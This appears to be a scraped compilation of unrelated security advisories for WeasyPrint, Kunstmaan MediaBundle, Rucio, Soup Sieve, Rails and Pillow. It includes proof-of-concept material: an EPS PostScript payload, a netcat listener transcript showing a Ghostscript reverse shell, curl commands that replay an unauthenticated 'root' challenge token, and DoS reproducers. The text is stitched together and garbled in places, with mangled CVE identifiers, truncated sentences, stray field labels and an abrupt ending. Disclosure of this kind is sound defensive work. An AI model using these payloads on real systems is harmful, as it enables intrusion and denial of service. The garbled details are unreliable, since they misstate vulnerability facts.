### Summary This was found during a pentest, funded by the NLNnet foundation, conducted by Stefan Vink from Radically Open Security and the only High issue found. WeasyPrint passes fetched image bytes directly to Pillow's generic format dispatcher without restricting the input format. When Ghostscript is installed on the host, Pillow's EpsImagePlugin invokes it to rasterize attacker-controlled EPS/PS input. Any content that can supply an image to WeasyPrint (an URL, CSS image value, SVG image reference, or data URI) can therefore drive untrusted PostScript into an external interpreter. On hosts running a Ghostscript version with a known -dSAFER bypass, this yields remote code execution. ### Details The image pipeline reads an external response and hands the raw bytes to Pillow's format-agnostic Image.open, with no allowlist of safe raster formats: with fetch(url_fetcher, url) as response: bytestring = response.read() mime_type = forced_mime_type or response.content_type ... pillow_image = Image.open(BytesIO(bytestring)) Pillow selects the handler from the byte signature. For EPS/PS input it selects PIL.EpsImagePlugin, which invokes Ghostscript to rasterize the input when a Ghostscript executable is available. Modern Ghostscript builds may run with -dSAFER, but that does not remove the interpreter boundary — it only constrains it, and multiple CVEs have bypassed it. The defect in WeasyPrint is that it dispatches untrusted bytes to a format handler capable of invoking an external interpreter, without first validating that the input is a format whose safe handling WeasyPrint can guarantee. - Input: an image URL in , a CSS image value, an SVG image reference, or a data URI. - Sink: the Ghostscript invocation inside Pillow's PIL.EpsImagePlugin, reached from weasyprint/images.py:287-327. ### Missing guards: - No allowlist limits image input to safe raster formats (e.g. PNG, JPEG, WebP) before Pillow's format dispatch. - No interpreter-specific CPU, memory, filesystem, or process-isolation guard exists in this path. Hosts without Ghostscript installed do not reach the EPS rasterization path; that is an environment dependency, not an input-format guard within WeasyPrint. ### PoC 1. Construct a minimal EPS payload that proves the Ghostscript subprocess executes attacker-supplied PostScript. The following 201-byte payload writes a marker file: postscript %!PS-Adobe-3.0 EPSF-3.0 %%BoundingBox: 0 0 100 100 (/tmp/test-marker.txt) (w) file dup (test_GHOSTSCRIPT_MARKER\n) writestring closefile 0.5 setgray 0 0 100 100 rectfill showpage %%EOF 1. The path /tmp/test-marker.txt is illustrative; a hardened reproduction writes the marker into a unique mode-0700 directory created with tempfile.mkdtemp. The write destination exists only to prove the Ghostscript subprocess executed user-supplied PostScript. 2. Embed the payload in a data:image/x-eps;base64,... URI inside an element and render the document with WeasyPrint. The run requires no shell, network, reverse shell, or deployment endpoint. 3. Observe the outcome: record the Ghostscript version, the render return code, the generated PDF size, and the private marker file contents. On Ghostscript 10.05.1 this was constrained to the bounded file write above. 4. To confirm the full RCE chain, a down-rev Ghostscript 10.03.0 was invoked directly with the CVE-2024-29510 payload while a netcat listener ran on 127.0.0.1:4444. The Ghostscript subprocess connected back and dropped into an interactive shell within a 30-second window: $ nc -lvnp 4444 127.0.0.1 & Ncat: Version 7.94 ( https://nmap.org/ncat ) Ncat: Listening on 127.0.0.1:4444 $ gs -dSAFER -dBATCH -dNOPAUSE -dPARANOIDSAFER -sDEVICE=ppmraw \ -sOutputFile=/dev/null - < cve-2024-29510_payload.eps ... Ncat: Connection from 127.0.0.1:51884. bash: cannot set terminal process group (261755): Inappropriate ioctl for device bash: no job control in this shell tester@host:~$ 4. A host without Ghostscript installed does not reach the EPS rasterization path. ### Impact This is a remote code execution vulnerability (via untrusted-input-to-external-interpreter dispatch). - Rendering untrusted EPS through WeasyPrint on a host with Ghostscript installed executes attacker-controlled PostScript. On Ghostscript 10.05.1 the effded file write. - On a host running a Ghostscript version with a known -dSAFER bypass, the same input path yields full remote code execution — demonstrated with CVE-2024.03.0, which is still shipped in many LTS and end-of-life branches. - The unconditional defect in WeasyPrint is the missing image-format allowlist, which is what makes the interpreter reachable from untrusted input. ### Who is impacted: Any deployment that renders untrusted or partially-untrusted HTML/CSS/SVG through WeasyPrint on a host where Ghostscript is installed along combination on general-purpose document-rendering servers.

### Summary

The MediaBundle blocks dangerous upload extensions with a blacklist that was matched
case-sensitively, while the stored filename was lowercased afterwards. A file uploaded
as `webshell.pHp` therefore bypassed the blacklist and was written to the web-accessible
upload directory as `webshell.php`, where the web server executed it. Any authenticated
backend user with access to the media section could obtain remote code execution.

### Details

`FileHandler::getFilePath()` rewrote blacklisted extensions to `.txt` using a
case-sensitive regex, and only then lowercased the extension when building the stored
name — so the check ran against the attacker-controlled casing and the normalisation
happened after it.

Two further weaknesses contributed:

* The default blacklist contained only `php` and `htaccess`, leaving other
  server-executable extensions (`phtml`, `php5`, `phar`, `shtml`, `cgi`, …) unblocked
  regardless of casing.
* Configured blacklist values were interpolated into the regex unescaped.

### Impact

An authenticated user with access to the admin media section can upload a file that the
web server executes as PHP. The uploaded file is reachable over HTTP without
authentication, giving arbitrary code execution as the web server user.

### Patches

Fixed in kunstmaan/media-bundle 7.3.2. The extension is now normalised before it is
checked and compared with `in_array()`; the default blacklist is expanded to the full
set of server-executable extensions; and a new opt-in `allowed_extensions` option allows
projects to enforce a strict allow-list.

Note that the patch does not rename files already stored on disk. Sites should audit
their media upload directory for existing files with an executable extension.

### Workarounds

If you cannot upgrade, configure the web server to refuse to execute scripts in the
media upload directory (for example a `location` block in nginx or `php_flag engine off`
in Apache).

## Summary

SSH challenge tokens are mistakenly accepted as valid credentials during the authentication token validation process.

While an SSH challenge token is intended as a short-lived nonce for use in a subsequent SSH key exchange, the function to validate authentication tokens does not differentiate between these and actual authentication tokens. Because challenge tokens are generated based on an account name provided via headers without requiring prior authentication, an unauthenticated attacker can request a valid "challenge" token for any account (including administrative ones) and use it to authenticate against other API endpoints.

## Proof of Concept

The vulnerability exists because SSH challenge tokens are stored in the same database table as regular authentication tokens and `validate_auth_token` in `lib/rucio/core/authentication.py` accepts these "challenge" tokens. An attacker can obtain a challenge token for an account such as “root��� via the REST API and then present it as a valid authentication bearer token:

1. Request a challenge token for an arbitrary account (e.g., "root"):
   `curl -i -H "X-Rucio-Account: root" https://rucio/auth/ssh_challenge_token`
2. The server returns a `200 OK` with the header `X-Rucio-SSH-Challenge-Token`.
3. The attacker can then use this specific token within the ten-second challenge lifetime as an authentication credential in subsequent requests to the Rucio API:
  `curl -H "X-Rucio-Auth-Token: $CHALLENGE_TOKEN"  https://rucio/accounts/whoami`

## Summary

Matching a selector that uses the descendant combinator (`a b`) takes time that grows polynomially with how deeply the document is nested, and each extra descendant combinator in the selector raises the degree by one. A selector with `k` descendant combinators takes `O(n^(k+1))` time on a chain of `n` nested elements.

An attacker who controls the HTML or XML that an application passes to Soup Sieve (directly, or through Beautiful Soup's `select()`, `select_one()`, `css.select()`, etc.) can send a very small, deeply nested document that keeps a CPU busy for seconds to minutes against an ordinary selector such as `section div div`.

## Details

To match `a b`, Soup Sieve checks each element against `b` and then walks up through its ancestors looking for one that matches `a`. When the selector has more descendant combinators, the rest of the selector is tried again from each ancestor on that walk, and so on for every combinator. Nothing was reused between walks, so the same ancestors were matched against the same part of the selector over and over.

The worst case is when the leftmost part of the selector never matches, as in `section div div` against a document of nested `<div>` with no `<section>`: every walk goes all the way to the root and no search can stop early.

### Timings

Example timings with `html.parser` on Soup Sieve 3.0.4 and 4.0, using a document of nested `<div>` (5 bytes each) and no matches:

| Nesting depth | Input size | Selector | 3.0.4 | 4.0 |
| --- | --- | --- | --- | --- |
| 2,000 | 10 KB | `section div` | 1.6 s | 0.05 s |
| 4,000 | 20 KB | `section div` | 5.1 s | 0.01 s |
| 400 | 2 KB | `section div div` | 6.7 s | < 0.01 s |
| 800 | 4 KB | `section div div` | 53.0 s | < 0.01 s |
| 100 | 0.5 KB | `section div div div` | 2.5 s | < 0.01 s |
| 200 | 1 KB | `section div div div` | 40.9 s | < 0.01 s |

None of these selectors use unusual syntax.

## Proof of concept

```py
import time
import bs4
import soupsieve as sv

soup = bs4.BeautifulSoup('<div>' * 200, 'html.parser')
t = time.process_time()
sv.select('section div div div', soup)
print(time.process_time() - t)
```

On affected versions, doubling the nesting depth multiplies the time by about 2^(k+1), where `k` is the number of descendant combinators: about 4x for `section div`, 8x for `section div div`, and 16x for `section div div div`.

## Impact

Applications are affected if they run selectors with descendant combinators against documents that untrusted users can influence, such as scrapers, HTML sanitizers or filters, and services that process uploaded or fetched markup. Descendant combinators are among the most common parts of CSS selectors, and a document of about 1 KB is enough to tie up a worker for close to a minute. Applications that only run selectors against trusted documents are not affected.

## Patches

Fixed in 4.0 by [facelessuser/soupsieve#351](https://github.com/facelessuser/soupsieve/pull/351). Whether an element is, or has an ancestor that is, a match for part of a selector depends only on its parent, so Soup Sieve now caches that result per element and relation for every element visited on the walk. Each descendant combinator is then linear in the size of the document. Results are unchanged, and ordinary documents are no slower.

Caching is enabled by default, so no changes are needed beyond upgrading. The `NOCACHE` flag is a temporary fallback for users who run into problems with caching, and it is planned for removal. It uses the old uncached matching, so selectors compiled with `NOCACHE` are still subject to polynomial time and shouldn't be used with descendant combinators on untrusted input.

## Workarounds

If users can't upgrade:

- Use as few descendant combinators as they can in selectors that run on untrusted documents. Where the structure of the
  document is known, the child combinator (`a > b`) only looks at the parent and is not affected.
- Limit the size and nesting depth of untrusted documents before selecting on them.
- Run selection on untrusted input with a time limit, for example in a worker process that can be stopped.

## Summary Matching a selector that puts a general-sibling combinator inside `:has()`, such as `div:has(a ~ b)`, against untrusted HTML runs in O(n²) time in the number of sibling elements. A single small document with a few thousand siblings ties the process up for a minute of CPU, so an application that runs a fixed selector of this shape over HTML it doesn't control can be stalled by one request. `:has` is powerful, but much in the same way poor regular expressions can be crafted to cause catastrophic backtracking with greedy capturing, has can be used to create non-ideal scenarios that can cause large portions of the tree to be evaluated for one or many elements if not used thoughtfully. This behavior is not exclusive to Soup Sieve, but browsers make note of these potential performance issues themselves: https://developer.mozilla.org/en-US/docs/Web/CSS/Reference/Selectors/:has#performance_considerations. With all of that said, there is room for improvements that can in some cases greatly improve performance. ## Details `:has(a ~ b)` asks "does this element contain an `a` that has a later sibling `b`?". When no `b` is present, soupsieve can't short-circuit, and it answers the question with a nested scan: `match_future_child` walks every candidate `a` under the scope, and for each one the general-sibling branch of `match_future_relations` walks all of that `a`'s following siblings looking for `b`. With n siblings that is (n-1) + (n-2) + ... + 1 comparisons, i.e. O(n²). The adjacent-sibling form `div:has(a + b)` stays linear, because its branch checks only the one immediately following sibling per candidate. So the cost is specific to the general-sibling `~` (and `~` nested inside `:has`), and it shows up on the common case where the right-hand side simply isn't there. ## Proof of concept Installed from PyPI: `pip install soupsieve==2.9.2 beautifulsoup4`. ```python import time import soupsieve from bs4 import BeautifulSoup selector = "div:has(a ~ b)" for n in (1000, 2000, 4000, 8000): html = "
" + ("" * n) + "
" soup = BeautifulSoup(html, "html.parser") start = time.perf_counter() soupsieve.select(selector, soup) print(n, round((time.perf_counter() - start) * 1000), "ms") ``` Measured: ``` n=1000 837 ms n=2000 3667 ms n=4000 14797 ms n=8000 59746 ms ``` Time quadruples for each doubling of n. The n=8000 input is a ~56 KB HTML fragment. ## Impact Availability. Any caller that evaluates a fixed selector containing a general sibling under `:has()` over attacker-controlled markup can be forced to spend minutes of CPU on a small input. The selector is developer-authored and ordinary; the untrusted part is the HTML, which is soupsieve's normal input. A single-pass evaluation of the sibling run (remember whether an `a` has been seen while scanning the siblings once) would make this case linear. ## Mitigation Quadratic time for `:has` in some circumstances is expected and not a bug. While we've made optimizations and there may be more in the future, the way `:has` is designed to operate will never perform in linear time in all circumstances. Users should thoughtfully apply the use of `:has`. The anchor selector (the `A` in `A:has(B)`) should not be an element that has too many children. Additionally, too general an anchor, such as `*`, can cause `:has()` to be applied to every element. Further, it is recommended that the inner selector (the `B` in `A:has(B)`) should use combinators like `>` or `+` to limit traversal. When the selector inside `:has()` is not tightly constrained, Soup Sieve might need to traverse the entire subtree of the anchor element to check the condition. If the risk for a given project is too great, user input can be scanned for usage of `:has` and be denied. Calls can also be wrapped in a timeout to prevent long-running processes as well.

### Impact
A Rails application that processes attachments with ImageMagick may allow an unauthenticated attacker to write arbitrary files on the server and, when attachments are stored with the Disk service, to read arbitrary files readable by the application process. Those files typically include `secret_key_base` and credentials for external systems, which may in turn allow escalation to remote code execution or lateral movement to those systems.

### Details
ImageMagick selects a coder from the content of the file it is given, and some coders act on files named inside the image rather than on the image itself. Active Storage constrained none of ImageMagick's coders, and the ImageMagick analyzer runs when a file is attached, so an attacker who can upload a crafted file may be able to invoke one. Attaching the upload is sufficient; no variant, preview, or `analyze` call is required. One specific attack chain has been reported to us, but we do not assume it is the only one that exists.

The fixed versions ship an ImageMagick security policy and prepend its directory to `MAGICK_CONFIGURE_PATH` through `MiniMagick.cli_env`, so every ImageMagick process that MiniMagick spawns applies it. The policy denies the `MSL` scripting coder, the coders that read or delete files other than the image, fetch remote or local references, or display to a screen, every coder backed by Ghostscript together with the `gs` delegate, and `@filename` indirection. ImageMagick applies every `policy.xml` on its search path, so the shipped policy adds to the host's policy rather than replacing it. The policy applies to every ImageMagick command that MiniMagick runs, not only those of Active Storage. See the `activestorage` CHANGELOG and "ImageMagick Security Policy" in the Active Storage guide.

### Affected applications
An application is affected if it meets all of these requirements:
- Uses ImageMagick for Active Storage image processing. This is `config.active_storage.variant_processor = :mini_magick`, which is the default for applications on `load_defaults 6.1` or earlier.
- Runs ImageMagick under a security policy that does not already deny the coders involved. The policies that Debian and Ubuntu package do not.
- Allows file uploads from untrusted users.

### Mitigation
- Upgrade to a fixed version of `activestorage`.
- An application whose variant processor is `:mini_magick` must use mini_magick `>= 5.1`, which applying the policy requires. With an older mini_magick, such an application raises an exception during boot.
- An application that renders PostScript or PDF through ImageMagick must re-allow the `gs` delegate and the coders it uses in the host's `policy.xml`.
- An application that replaces `MiniMagick.cli_env` after boot, clears the environment with `MiniMagick.cli_prefix`, or installs its own `MiniMagick::Shell` does not receive the shipped policy and must carry its rules in ImageMagick's system policy. GraphicsMagick does not read ImageMagick policies.
- If attachments are stored with the Disk service, change `secret_key_base` and every secret readable by the application process, including the master key and everything `config/credentials.yml.enc` holds, storage and database credentials, and third-party tokens. Do not retain an exposed secret as a fallback.

### Workarounds
Copy the rules of the policy that the fixed versions ship, `activestorage/lib/active_storage/image_magick/policy.xml`, into ImageMagick's system policy, for example `/etc/ImageMagick-7/policy.xml`. At a minimum, deny the `MSL` coder, the Ghostscript coders, and the `gs` delegate:

```xml
<policy domain="coder" rights="none" pattern="MSL"/>
<policy domain="delegate" rights="none" pattern="gs"/>
<policy domain="coder" rights="none" pattern="{PS,PS2,PS3,EPS,EPS2,EPS3,EPI,EPSF,EPSI,EPT,EPT2,EPT3,PDF,AI,EPDF,PDFA,POCKETMOD,XPS,PCL}"/>
```

### Releases
The fixed releases are available at the normal locations.

Patches for those who cannot upgrade at once:
- 8.1: https://github.com/rails/rails/commit/468aa9a93fc98f5476b6821770f4ccfcb7f7d328
- 8.0: https://github.com/rails/rails/commit/ea8c40121ce53a3d0255cd4eb6d13bfe3bc01776

### Versions affected
- activestorage < 8.0.5.2
- activestorage >= 8.1, < 8.1.4.1

### Credit
This issue was responsibly reported by HackerOne researcher [ryotak](https://hackerone.com/ryotak).

### Impact
`ActionController::Live::Buffer#close` pushes its end-of-stream marker onto the response's bounded queue while it holds the buffer's monitor. When the client has stopped reading and the queue is full, the push blocks, and `Buffer#abort`, which runs when the client disconnects or a write times out, waits indefinitely for the same monitor. Each such response could permanently hold a web server thread and its `ActionController::Live` thread, possibly resulting in a DoS vulnerability through thread exhaustion.

Applications that stream responses with `ActionController::Live`, including `send_stream`, are affected. Applications that serve large files through Active Storage proxy mode are exposed to unauthenticated clients.

### Releases
The fixed releases are available at the normal locations.

Patches for those who cannot upgrade at once:
- 8.1: https://github.com/rails/rails/commit/ccbfc09690fef05fdd2a9969c917a71b92cc98fc.patch
- 8.0: https://github.com/rails/rails/commit/27ad18ed5900dee28ba20e9c6fc718ff751fa215.patch

### Credit
This issue was found by the Anthropic OSS Scanner (ANT-2026-LDFW5N2T).

### Impact
When `ActionDispatch::Cookies` reads a signed or encrypted cookie that was written under a rotated secret (`config.action_dispatch.cookies_rotations`) or in the format that a `:hybrid` cookie serializer migrates from, it writes the cookie back to the response in the current format, and that write ignores `request.session_options[:skip]`. `ActiveStorage::DisableSession` relies on that option to keep the session cookie off the public, immutable responses of the Active Storage proxy controllers, but those controllers still load the session, so a request carrying an old-format session cookie could receive the rewritten session cookie in `Set-Cookie` on a cacheable response. A shared cache that stores such a response together with its `Set-Cookie` header could then serve one user's session to later requesters of the same URL, or serve an attacker's session to other users.

Applications are affected when they serve Active Storage files through the proxy controllers, have a cookie rotation or a `:hybrid` serializer migration configured, and run behind a cache that stores `Set-Cookie` on public responses. This is a path around the fix for [CVE-2024-26144](https://github.com/advisories/GHSA-8h22-8cf7-hq6g).

### Details
In the fixed releases, a response that skips the session leaves an old-format signed or encrypted cookie unchanged, and the next request that does not skip the session upgrades it. An application that skips the session on every request no longer upgrades its signed or encrypted cookies. Cookies that the application sets explicitly are still written. See the Action Pack CHANGELOG.

### Workarounds
Configure caching proxies not to store responses that carry a `Set-Cookie` header, or complete the cookie rotation or serializer migration and remove it from the configuration.

### Releases
The fixed releases are available at the normal locations.

Patches for those who cannot upgrade at once:
- 8.1: https://github.com/rails/rails/commit/849a6c30eacbb6ca4722132f43c4333a93188556.patch
- 8.0: https://github.com/rails/rails/commit/0e6cf8faa89caf4c64311d35ca2bc88c1458d4e3.patch

### Credit
This issue was responsibly reported by HackerOne researcher [flashmyname](https://hackerone.com/flashmyname).

### Impact
`ActionView::Helpers::TextHelper#highlight` substitutes each matched phrase into the `:highlighter` string without escaping it and returns the result marked HTML-safe. Because sanitizing leaves quote characters in text unescaped, a match substituted into a quoted attribute value of the highlighter, such as the `<a href="search?q=\1">` form shown in the method's documentation, could end the attribute value and add attributes to the element, possibly leading to XSS. Applications are affected when they pass a `:highlighter` that places a placeholder inside an attribute value and highlight text or phrases that a user controls. The default `<mark>\1</mark>` highlighter and the block form are not affected.

### Details

### Impact
`strip_tags` in Action View returns its sanitized output marked `html_safe`, but the underlying sanitizer encodes only `&`, `<` and `>`, leaving `"` and `'` unencoded. Applications that render `strip_tags` output from untrusted input inside an HTML attribute, for example in a `title` attribute or a `<meta content>` tag, are affected. Output rendered as element content is not affected.

### Details
`strip_tags` now encodes `"` and `'` in its output, as well as `&`, `<` and `>`, without double-encoding existing entities. Applications that use `strip_tags` output outside HTML, such as in a text template or JSON, now see `"` and `'` where they saw `"` and `'`; `CGI.unescapeHTML` decodes them. See the Action View CHANGELOG.

Pass `strip_tags` output to an attribute through a tag helper, which escapes attribute values, for example `tag.a(title: strip_tags(user_input))`.

### Impact
With the HTML5 sanitizer (`Rails::HTML5::Sanitizer`, the default vendor on CRuby for applications using `load_defaults 7.1` or later), Nokogiri before 1.19.5 serializes `<` and `>` unescaped inside attribute values. An unescaped `>` or a blank line inside an attribute value could cause markup in that value, which the sanitizer left inert, to be emitted as live elements in the helper's `html_safe` output, possibly leading to XSS. Applications that use the HTML5 sanitizer and pass untrusted text to `highlight`, or to `simple_format` with `html_options`, are affected.

The fixed releases require rails-html-sanitizer 1.7.2 or later, which requires Loofah 2.25.3 and Nokogiri 1.19.5. With these versions, the HTML5 sanitizer escapes `<` and `>` in attribute values as `<` and `>`, as the HTML4 sanitizer already does. The parsed DOM is unchanged, but code or tests that compare sanitized HTML as a string may see the new serialization.

cves.summary:
### Impact
When a GCS service is configured with the `cache_control` option, `ActiveStorage::Service::GCSService#url_for_direct_upload` signs direct-upload URLs with V4, and the V4 signature covers only the `Cache-Control` and `Host` headers. A direct-upload client can therefore send a `Content-Type` of its choosing, and can omit the declared `Content-MD5`, without invalidating the URL. GCS stores the supplied content type as object metadata, which takes precedence over the `response-content-type` that Active Storage sets on download URLs, so an uploaded object could be served as inline HTML under the application's bucket path on `storage.googleapis.com`. Script in such an object runs on the storage origin rather than the application's, but could register a Service Worker scoped to the bucket path and read or replace a victim's later responses for signed URLs in that bucket.

Applications that use the GCS service with `cache_control` configured and accept direct uploads are affected. GCS services without `cache_control` sign with V2 and are not affected.

### Details
The fixed releases sign every GCS direct-upload URL with V2, which binds an empty `Content-Type` and the declared `Content-MD5`. The configured `Cache-Control` is still returned by `headers_for_direct_upload` and sent by the client, but it is no longer part of the signature, and direct-upload URLs for these services are no longer limited to V4's seven-day maximum expiry. See the Active Storage CHANGELOG.

### Workarounds
Removing the `cache_control` option from the GCS service configuration makes Active Storage sign direct uploads with V2.

### Releases
The fixed releases are available at the normal locations.

Patches for those who cannot upgrade at once:
- 8.1: https://github.com/rails/rails/commit/8d93f6a872e9550a91bf0e4fce50083a235ef3b1.patch
- 8.0: https://github.com/rails/rails/commit/ddc08ba61a8001e7402864c62e466cf732fc7614.patch

### Credit
This issue was responsibly reported by HackerOne researcher [thepo1es](https://hackerone.com/thepo1es).

### Impact
`ActionController::Parameters#each_key` delegates to the internal `ActiveSupport::HashWithIndifferentAccess` that holds the request parameters, so when called with a block it returns that hash instead of the `Parameters` instance. The hash does not respond to `permitted?`, so Active Model mass assignment (`new`, `assign_attributes`, `update`) accepts it without raising `ActiveModel::ForbiddenAttributesError`. An application that passes the return value of `each_key` to mass assignment could allow a remote, unauthenticated attacker to set attributes that the application does not permit, such as an authorization flag.

This is an incomplete fix of [CVE-2020-8164](https://github.com/advisories/GHSA-8727-m6gj-mc37), which made `each`, `each_pair` and `each_value` return the `Parameters` instance but left `each_key` delegated.

### Details
The fixed releases define `Parameters#each_key` to yield each key and return the `Parameters` instance when given a block, as `each`, `each_pair` and `each_value` do, and to return an `Enumerator` without one. Code that used the return value of `each_key` as a hash now receives the `Parameters` instance, which mass assignment rejects unless it is permitted.

### Affected applications
An application is affected if it passes the return value of `ActionController::Parameters#each_key`, called with a block, to mass assignment. Rails itself makes no such call.

### Workarounds
Do not use the return value of `each_key`. Call it for its block only, and pass the permitted `Parameters` instance to mass assignment.

### Releases
The fixed releases are available at the normal locations.

cwe.name: Improperly Controlled Modification of Dynamically-Determined Object Attributes

cves.summary:
``` ============================================================================ ANT-2026-D7STJUWL [medium] CWE-770 dos Memory DoS in TIFF and EXIF IFD parsing via overlapping tag data Location: src/PIL/TiffImagePlugin.py:927 in ImageFileDirectory_v2.load() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` A small, crafted image file can make Pillow use thousands of times its own size in memory while the file is only being opened, which lets anyone who can submit an image crash or stall the process handling it. A 144 KB TIFF makes `Image.open()` return normally while holding 1.6 GiB of memory. The largest such standard TIFF, about 786 KB, asks for roughly 48 GiB, which in practice gets the worker killed by the operating system. The file declares a 1×1 image, so the decompression-bomb check never triggers and no warning is raised. There is no memory corruption; the impact is denial of service. The bug is in `ImageFileDirectory_v2.load()` in `src/PIL/TiffImagePlugin.py` (around line 927). For every directory entry whose value is stored elsewhere in the file, it reads that value into a new `bytes` object with `ImageFile._safe_read(fp, count * unit_size)` and keeps it in `_tagdata`. `_safe_read()` only checks that the bytes exist. Nothing limits the total read across entries, and nothing stops every entry from pointing at the same bytes. An attacker can therefore give each of N distinct private tags an offset and count that covers the whole file, at a cost of 12 bytes per entry. Memory grows as N × file size, which is quadratic in the file size, and BigTIFF removes the 65,535-entry ceiling. The same loop parses EXIF data, so the problem reaches beyond TIFF: * A 66 KB JPEG APP1 segment costs about 340 MiB inside `Image.open()` itself, via `_read_dpi_from_exif()`. * A 96 KB PNG `eXIf` chunk costs 754 MiB on `getexif()` or `ImageOps.exif_transpose()`. * WebP EXIF and MPO reach the same code. The attached reproducer builds a 72 KB TIFF and a 72 KB PNG. Using only `Image.open()` and `getexif()`, each causes 412 MiB of tag data to be retained, about 6,000 times the file size. The loop dates to the original PIL 1.1.7 import, so every Pillow release since 1.0 is affected. ## Details `TiffImagePlugin.ImageFileDirectory_v2.load()` reads the out-of-line value of every IFD entry into its own `bytes` object and keeps it in `self._tagdata`. Nothing bounds the sum of those reads, and nothing prevents every entry from pointing at the same region of the file. An IFD with N entries whose `(offset, count)` each cover the whole file therefore costs N × filesize bytes of memory, while the IFD itself costs only 12 bytes per entry. This one loop is the IFD parser for TIFF frames and for `Image.Exif` alike, so it is reachable from `Image.open()` on a TIFF or JPEG and from `getexif()` / `ImageOps.exif_transpose()` on PNG, JPEG, WebP and MPO. Observed on the stock build at this commit: a valid 144,110-byte 1×1 greyscale TIFF with 12,000 such entries makes `Image.open()` return normally (no exception, no warning, 1 declared pixel so `MAX_IMAGE_PIXELS` is irrelevant) after 1.5 s, with the process RSS grown from 15 MiB to 1,671 MiB and `im.tag_v2` holding 1,649 MiB of tag data for as long as the image object lives. The same IFD placed in the `eXIf` chunk of a 96 KB PNG makes `im.getexif()` retain 754 MiB. A 65,870-byte JPEG whose APP1 `Exif` segment is such an IFD (5,400 entries × 65,519 bytes) allocates ~340 MiB inside `Image.open()` itself, with no further call. ```python # src/PIL/TiffImagePlugin.py:902-946 (ImageFileDirectory_v2.load) for i in range(tag_count): tag, typ, count, data = ( … self._unpack("HHL4s", self._ensure_read(fp, 12))) … size = count * unit_size # 918: attacker-chosen if size > (8 if self._bigtiff else 4): here = fp.tell() (offset,) = self._unpack("Q" if self._bigtiff else "L", data) … fp.seek(offset) # 926: attacker-chosen data = ImageFile._safe_read(fp, size) # 927: new bytes object of `size` fp.seek(here) … self._tagdata[tag] = data # 945: kept self.tagtype[tag] = typ ``` `ImageFile._safe_read()` only guarantees that `size` bytes are actually present in the stream (it reads in `SAFEBLOCK` chunks and raises on truncation); it is a guard against allocating for data that does not exist, not against reading the same existing data many times. For a well-formed file each entry points at its own disjoint value, so the total read is at most the file size. For the crafted file every one of the N entries has a distinct tag number (so none overwrites another in `_tagdata`), type BYTE, `count = filesize - 1` and `offset = 1`; each iteration allocates and fills a fresh `filesize - 1`-byte object and stores it. `load()` does not care whether the tag number is known or whether the type makes sense for it; any 16-bit tag number and any type in `_load_dispatch` is accepted. Memory is `N × filesize`, and since `filesize ≈ 12 N`, it is quadratic in the file size: 12,000 entries / 144 KB → 1.6 GiB (measured); the classic-TIFF maximum of 65,535 entries / 786 KB → ~48 GiB; BigTIFF (`tag_count` is a `Q`) has no 16-bit entry limit at all. Reachability: - TIFF: `TiffImageFile._open()` (`TiffImagePlugin.py:1187`) → `self._seek(0)` (`:1210`) → `self.tag_v2.load(self.fp)` (`:1258`, and again at `:1271`). This runs inside `Image.open()`, before `load()` and before any size check (`_decompression_bomb_check` only looks at `width × height` and is satisfied by the 1×1 image), and the resulting directory stays referenced as `im.tag_v2`. `_seek()` parses the IFD twice, but `reset()` drops the first copy, so the peak does not double; it is paid again for every frame on `seek()`/`n_frames`. - EXIF in other formats: `Image.Exif.load()` / `load_from_fp()` / `_get_ifd_dict()` (`Image.py:4146-4196`, `:4119-4133`) wrap the same `ImageFileDirectory_v2.load()` around the EXIF blob. `PngImagePlugin.chunk_eXIf` (`PngImagePlugin.py:697`) stores the whole chunk as `info["exif"]`, `JpegImagePlugin` concatenates APP1 `Exif` segments into `info["exif"]` (`JpegImagePlugin.py:114-117`), and WebP exposes its EXIF chunk the same way; `im.getexif()`, `ImageOps.exif_transpose()` and `_getexif()` then parse it and keep the values in `im._exif`. For JPEG no explicit call is needed: `JpegImageFile._open()` ends with `self._read_dpi_from_exif()` (`JpegImagePlugin.py:413`), which calls `getexif()` whenever no JFIF DPI is present, so the APP1 IFD is parsed during `Image.open()`. Note that an EXIF blob is parsed into several IFDs (main, EXIF, GPS, Interop via `_get_ifd_dict`), each through its own `load()` call. The only failure path in `load()` is `except OSError` → warning; running out of memory is not an `OSError`, so on Linux the realistic outcome for a larger N is the kernel OOM killer terminating the process rather than a Python exception. The loop predates Pillow: it came in with the PIL 1.1.7 import in `9a640e315715` ("Forking PIL", 2010-07-30) and was carried over unchanged into `ImageFileDirectory_v2`, so every release since 1.0 is affected. The per-tag `_safe_read` bounding added in the CVE-2019-16865 era does not address the sum. ## Impact Any service that calls `Image.open()` on an uploaded TIFF or JPEG — or `getexif()` / `ImageOps.exif_transpose()` on an uploaded PNG, JPEG or WebP, which thumbnailers routinely do to honour orientation — can be made to allocate and retain memory roughly `entries × filesize`, i.e. thousands of times the upload size, from a file of a few hundred KB that declares a 1×1 image and passes the decompression-bomb check. A ~800 KB TIFF requests ~48 GiB; in practice the worker (or its container) is OOM-killed within seconds, taking down all requests it was serving, and repeated uploads keep it down. No pixel decoding, `load()`, or further API call is required for the TIFF and JPEG cases, `MAX_IMAGE_PIXELS` does not apply, and no `DecompressionBomb*` warning gives the application a chance to refuse the file. There is no memory corruption; the effect is denial of service of the process handling the input. This is the same class as CVE-2021-27921/27922/27923 (BLP/ICNS/ICO "arbitrarily large memory allocations" from unchecked reported sizes, fixed in 8.1.2) and CVE-2021-28675 (PSD layer count not checked against the data size, DoS on `Image.open()` prior to `load()`), here in the TIFF/EXIF directory parser shared by several formats. ## Reproducing `repro` is a single Python script that runs against the stock Pillow in `/src`; nothing is compiled. It needs about 1 GB of free RAM (it caps its own address space at 4 GiB so that a larger run ends in `MemoryError` rather than the OOM killer). **Input.** `aliased_ifd()` builds, in memory, a little-endian classic TIFF: an 8-byte header, one IFD, nothing else. Every crafted entry is a private tag (1000 upwards) of type BYTE with `offset = 1` and `count = file size - 1`, i.e. each claims the whole file body as its value. Each costs 12 bytes in the file but a full file-sized read in `ImageFileDirectory_v2.load()`. **TIFF path.** The first file adds 8 ordinary tags (ImageWidth = ImageLength = 1, BitsPerSample = 8, no compression, BlackIsZero, one 1-byte strip pointing at a header byte) so that Pillow accepts it as a 1×1 `L` image, plus 6,000 aliased tags (72,110 bytes). Because the image is 1×1, `MAX_IMAGE_PIXELS` never comes into play. The script calls `Image.open()` on it and nothing else: no `load()`, no pixel access. **EXIF path.** The same 6,000-entry IFD (without the image tags) is passed as `exif=` when saving a 1×1 PNG, so it lands in an `eXIf` chunk; the script opens that PNG and calls `im.getexif()`, which is what `ImageOps.exif_transpose()` calls. **Check.** For each path the script reads `VmRSS` from `/proc/self/status` before and after, and adds up 